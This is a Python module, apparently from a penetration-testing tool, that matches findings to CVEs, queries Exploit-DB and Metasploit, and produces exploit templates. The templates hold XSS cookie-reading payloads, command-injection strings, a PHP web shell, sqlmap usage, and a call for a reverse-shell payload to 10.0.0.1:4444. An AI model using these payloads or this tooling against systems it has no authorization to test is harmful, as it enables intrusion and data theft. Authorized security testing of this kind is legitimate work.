"""
Exploitation Engine
Integrates Exploit-DB, Metasploit, and automatic exploit generation from CVEs

Meowware v17.0 - Developed by Carlos Mancera
"""
import subprocess
import json
import re
import requests
from typing import List, Dict, Any, Optional
from ..core.models import Finding, Host, Severity, EvidenceType
from ..core.debug import debug_print
from ..intelligence.cve_lookup import CVELookup
from ..tools.vuln_verifier import VulnVerifier
from .safe_verifier import SafeExploitVerifier
from .payload_generator import PayloadGenerator

class ExploitEngine:
    """
    Exploits vulnerabilities found in the system.
    Integrates with Exploit-DB, Metasploit, and generates exploits from CVEs.
    """
    
    def __init__(self, cve_lookup: CVELookup):
        self.cve_lookup = cve_lookup
        self.exploit_db_path = "/usr/share/exploitdb"
        self.metasploit_available = self._check_metasploit()
        self.exploitdb_available = self._check_exploitdb()
        self.verifier = VulnVerifier()
        self.safe_verifier = SafeExploitVerifier()
    
    def _check_metasploit(self) -> bool:
        """Check if Metasploit is available"""
        try:
            result = subprocess.run(["which", "msfconsole"], capture_output=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def _check_exploitdb(self) -> bool:
        """Check if Exploit-DB (searchsploit) is available"""
        try:
            result = subprocess.run(["which", "searchsploit"], capture_output=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def find_exploit(self, finding: Finding, host: Host) -> Optional[Dict[str, Any]]:
        """
        Find available exploit for a vulnerability.
        Tries: Exploit-DB → Metasploit → CVE-based generation
        """
        debug_print(f"    [Exploit Engine] Searching exploit for: {finding.title}")
        
        # 1. Extract CVE ID if present
        cve_id = self._extract_cve_id(finding)
        if not cve_id:
            # Try to extract product/version
            product, version = self._extract_product_version(finding)
            if product and version:
                cve_id = self._find_cve_for_product(product, version)
        
        if not cve_id:
            debug_print(f"      ⚠️  No CVE found for {finding.title}")
            return None
        
        # 2. Search Exploit-DB
        if self.exploitdb_available:
            exploitdb_result = self._search_exploitdb(cve_id)
            if exploitdb_result:
                debug_print(f"      ✓ Found Exploit-DB exploit: {exploitdb_result.get('title')}")
                return {
                    "source": "exploitdb",
                    "cve": cve_id,
                    "exploit": exploitdb_result,
                    "executable": True
                }
        
        # 3. Search Metasploit
        if self.metasploit_available:
            metasploit_result = self._search_metasploit(cve_id)
            if metasploit_result:
                debug_print(f"      ✓ Found Metasploit module: {metasploit_result.get('name')}")
                return {
                    "source": "metasploit",
                    "cve": cve_id,
                    "exploit": metasploit_result,
                    "executable": True
                }
        
        # 4. Generate exploit from CVE
        generated_exploit = self._generate_exploit_from_cve(cve_id, finding, host)
        if generated_exploit:
            debug_print(f"      ✓ Generated exploit from CVE: {cve_id}")
            return {
                "source": "generated",
                "cve": cve_id,
                "exploit": generated_exploit,
                "executable": True
            }
        
        debug_print(f"      ⚠️  No exploit found for {cve_id}")
        return None
    
    def _extract_cve_id(self, finding: Finding) -> Optional[str]:
        """Extract CVE ID from finding"""
        text = f"{finding.title} {finding.description}"
        match = re.search(r'CVE-\d{4}-\d+', text)
        return match.group(0) if match else None
    
    def _extract_product_version(self, finding: Finding) -> tuple:
        """Extract product and version from finding"""
        text = f"{finding.title} {finding.description}".lower()
        
        patterns = [
            (r'wordpress\s+(\d+\.\d+(?:\.\d+)?)', 'WordPress'),
            (r'apache\s+(\d+\.\d+(?:\.\d+)?)', 'Apache'),
            (r'nginx\s+(\d+\.\d+(?:\.\d+)?)', 'Nginx'),
            (r'php\s+(\d+\.\d+(?:\.\d+)?)', 'PHP'),
            (r'mysql\s+(\d+\.\d+(?:\.\d+)?)', 'MySQL'),
        ]
        
        for pattern, product in patterns:
            match = re.search(pattern, text)
            if match:
                return product, match.group(1)
        
        return None, None
    
    def _find_cve_for_product(self, product: str, version: str) -> Optional[str]:
        """Find CVE for product/version"""
        cves = self.cve_lookup.lookup_cves(product, version)
        if cves:
            # Return the most critical CVE
            critical_cves = [c for c in cves if c.get('cvss', 0) >= 9.0]
            if critical_cves:
                return critical_cves[0].get('id')
            return cves[0].get('id')
        return None
    
    def _search_exploitdb(self, cve_id: str) -> Optional[Dict[str, Any]]:
        """Search Exploit-DB for CVE"""
        try:
            result = subprocess.run(
                ["searchsploit", "-j", "--cve", cve_id],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0 and result.stdout:
                try:
                    data = json.loads(result.stdout)
                    exploits = data.get("RESULTS_EXPLOIT", [])
                    if exploits:
                        exploit = exploits[0]  # Get first result
                        return {
                            "title": exploit.get("Title", ""),
                            "edb_id": exploit.get("EDB-ID", ""),
                            "path": exploit.get("Path", ""),
                            "type": exploit.get("Type", ""),
                            "platform": exploit.get("Platform", "")
                        }
                except json.JSONDecodeError:
                    # Parse text output
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if cve_id.lower() in line.lower() and "|" in line:
                            parts = line.split("|")
                            if len(parts) >= 3:
                                return {
                                    "title": parts[1].strip(),
                                    "edb_id": parts[0].strip(),
                                    "path": parts[-1].strip() if len(parts) > 2 else "",
                                    "type": "unknown",
                                    "platform": "unknown"
                                }
        except Exception as e:
            debug_print(f"      ⚠️  Exploit-DB search failed: {e}")
        
        return None
    
    def _search_metasploit(self, cve_id: str) -> Optional[Dict[str, Any]]:
        """Search Metasploit for CVE"""
        try:
            # Use msfconsole to search
            cmd = f'msfconsole -q -x "search cve:{cve_id}; exit"'
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0 and result.stdout:
                # Parse Metasploit output
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'exploit/' in line.lower() or 'auxiliary/' in line.lower():
                        parts = line.split()
                        if len(parts) >= 2:
                            return {
                                "name": parts[0],
                                "type": "exploit" if "exploit/" in line else "auxiliary",
                                "rank": parts[1] if len(parts) > 1 else "normal",
                                "description": " ".join(parts[2:]) if len(parts) > 2 else ""
                            }
        except Exception as e:
            debug_print(f"      ⚠️  Metasploit search failed: {e}")
        
        return None
    
    def _generate_exploit_from_cve(self, cve_id: str, finding: Finding, host: Host) -> Optional[Dict[str, Any]]:
        """Generate exploit from CVE information"""
        # Get CVE details
        cve_info = self.cve_lookup.lookup_by_cve_id(cve_id)
        if not cve_info:
            return None
        
        # Analyze vulnerability type
        vuln_type = self._classify_vulnerability_type(cve_info, finding)
        
        # Generate exploit template based on type
        exploit_template = self._generate_exploit_template(vuln_type, cve_info, finding, host)
        
        if exploit_template:
            return {
                "type": vuln_type,
                "template": exploit_template,
                "cve": cve_id,
                "description": cve_info.get('summary', ''),
                "cvss": cve_info.get('cvss', 0)
            }
        
        return None
    
    def _classify_vulnerability_type(self, cve_info: Dict[str, Any], finding: Finding) -> str:
        """Classify vulnerability type"""
        summary = cve_info.get('summary', '').lower()
        finding_text = f"{finding.title} {finding.description}".lower()
        
        if 'sql injection' in summary or 'sqli' in finding_text:
            return "sql_injection"
        elif 'xss' in summary or 'cross-site scripting' in summary:
            return "xss"
        elif 'rce' in summary or 'remote code execution' in summary:
            return "rce"
        elif 'command injection' in summary:
            return "command_injection"
        elif 'file upload' in summary:
            return "file_upload"
        elif 'authentication bypass' in summary or 'auth bypass' in summary:
            return "auth_bypass"
        elif 'buffer overflow' in summary:
            return "buffer_overflow"
        elif 'deserialization' in summary:
            return "deserialization"
        else:
            return "generic"
    
    def _generate_exploit_template(self, vuln_type: str, cve_info: Dict[str, Any], 
                                  finding: Finding, host: Host) -> Optional[str]:
        """Generate exploit template based on vulnerability type"""
        templates = {
            "sql_injection": self._generate_sqli_template,
            "xss": self._generate_xss_template,
            "rce": self._generate_rce_template,
            "command_injection": self._generate_cmd_injection_template,
            "file_upload": self._generate_file_upload_template,
            "auth_bypass": self._generate_auth_bypass_template,
        }
        
        generator = templates.get(vuln_type)
        if generator:
            return generator(cve_info, finding, host)
        
        return None
    
    def _generate_sqli_template(self, cve_info: Dict[str, Any], finding: Finding, host: Host) -> str:
        """Generate SQL injection exploit template"""
        return f"""
# SQL Injection Exploit for {cve_info.get('id', 'CVE')}
# Target: {host.hostname or host.ip}
# Vulnerability: {finding.title}

# Use SQLMap for exploitation:
# sqlmap -u "{host.web_context.url if host.web_context else 'TARGET_URL'}" --batch --dbs
"""
    
    def _generate_xss_template(self, cve_info: Dict[str, Any], finding: Finding, host: Host) -> str:
        """Generate XSS exploit template"""
        return f"""
# XSS Exploit for {cve_info.get('id', 'CVE')}
# Target: {host.hostname or host.ip}

# Payload examples:
# <script>alert(document.cookie)</script>
# <img src=x onerror=alert(document.cookie)>
# <svg onload=alert(document.cookie)>
"""
    
    def _generate_rce_template(self, cve_info: Dict[str, Any], finding: Finding, host: Host) -> str:
        """Generate RCE exploit template"""
        return f"""
# RCE Exploit for {cve_info.get('id', 'CVE')}
# Target: {host.hostname or host.ip}

# Use Metasploit or custom exploit
# msfconsole -> use exploit/path/to/exploit
"""
    
    def _generate_cmd_injection_template(self, cve_info: Dict[str, Any], finding: Finding, host: Host) -> str:
        """Generate command injection exploit template"""
        return f"""
# Command Injection Exploit for {cve_info.get('id', 'CVE')}
# Target: {host.hostname or host.ip}

# Payload examples:
# ; id
# | id
# || id
# && id
# `id`
# $(id)
"""
    
    def _generate_file_upload_template(self, cve_info: Dict[str, Any], finding: Finding, host: Host) -> str:
        """Generate file upload exploit template"""
        return f"""
# File Upload Exploit for {cve_info.get('id', 'CVE')}
# Target: {host.hostname or host.ip}

# Upload web shell (PHP example):
# <?php system($_GET['cmd']); ?>
"""
    
    def _generate_auth_bypass_template(self, cve_info: Dict[str, Any], finding: Finding, host: Host) -> str:
        """Generate authentication bypass exploit template"""
        return f"""
# Authentication Bypass Exploit for {cve_info.get('id', 'CVE')}
# Target: {host.hostname or host.ip}

# Try bypass techniques:
# - SQL injection in login
# - Default credentials
# - Session manipulation
# - JWT manipulation
"""
    
    def execute_exploit(self, exploit: Dict[str, Any], host: Host) -> Dict[str, Any]:
        """
        Execute exploit (safely, with verification).
        Returns exploitation result.
        """
        debug_print(f"    [Exploit Engine] Executing exploit from {exploit.get('source')}")
        
        source = exploit.get('source')
        
        if source == "exploitdb":
            return self._execute_exploitdb_exploit(exploit, host)
        elif source == "metasploit":
            return self._execute_metasploit_exploit(exploit, host)
        elif source == "generated":
            return self._execute_generated_exploit(exploit, host)
        
        # v18.0: Safe-Mode Verification
        if exploit.get("safe_verification", False): 
            # Use new safe verifier
            return self.safe_verifier.verify(
                Finding(title=exploit.get('type', 'generic'), description="Exploit verification", severity=Severity.HIGH, recommendation="", category="Exploit"), 
                host
            )

        return {"success": False, "reason": "Unknown exploit source"}

    def verify_finding_safely(self, finding: Finding, host: Host) -> bool:
        """
        Public method to safely verify a finding.
        If verified, generates a PoC payload.
        """
        is_verified, evidence = self.safe_verifier.verify(finding, host)
        
        if is_verified:
            # Update finding status
            finding.status = "CONFIRMED"
            finding.evidence_type = EvidenceType.VULNERABILITY
            finding.confidence_score = 1.0
            if "[VERIFIED]" not in finding.description:
                finding.description = f"[VERIFIED] {finding.description}"
            
            # v19.0: Generate PoC Payload
            target_os = host.os_guess or "linux"
            payload = ""
            if "LFI" in finding.title or "Local File Inclusion" in finding.title:
                payload = PayloadGenerator.generate_lfi_payload(target_os)
            elif "RCE" in finding.title or "Code Execution" in finding.title:
                payload = PayloadGenerator.generate_rce_payload(target_os, "10.0.0.1", 4444)
            elif "XSS" in finding.title:
                payload = PayloadGenerator.generate_xss_payload()
            
            if payload:
                finding.raw_output = (finding.raw_output or "") + f"\n\n[PoC Payload]\n{payload}\n"
                
            debug_print(f"    [Safe Verification] {finding.title} CONFIRMED! Evidence: {evidence}")
            return True
            
        return False

        return {"success": False, "reason": "Unknown exploit source"}
    
    def _execute_exploitdb_exploit(self, exploit: Dict[str, Any], host: Host) -> Dict[str, Any]:
        """Execute Exploit-DB exploit"""
        # For safety, we don't execute exploits automatically
        # Instead, we provide the exploit path and instructions
        exploit_info = exploit.get('exploit', {})
        return {
            "success": True,
            "exploitable": True,
            "exploit_path": exploit_info.get('path', ''),
            "instructions": f"Exploit-DB exploit found: {exploit_info.get('title')}. Path: {exploit_info.get('path')}",
            "manual_execution_required": True
        }
    
    def _execute_metasploit_exploit(self, exploit: Dict[str, Any], host: Host) -> Dict[str, Any]:
        """Execute Metasploit exploit"""
        exploit_info = exploit.get('exploit', {})
        return {
            "success": True,
            "exploitable": True,
            "module": exploit_info.get('name', ''),
            "instructions": f"Metasploit module found: {exploit_info.get('name')}. Use: msfconsole -> use {exploit_info.get('name')}",
            "manual_execution_required": True
        }
    
    def _execute_generated_exploit(self, exploit: Dict[str, Any], host: Host) -> Dict[str, Any]:
        """Execute generated exploit"""
        exploit_info = exploit.get('exploit', {})
        return {
            "success": True,
            "exploitable": True,
            "template": exploit_info.get('template', ''),
            "instructions": "Generated exploit template available. Review and execute manually.",
            "manual_execution_required": True
        }


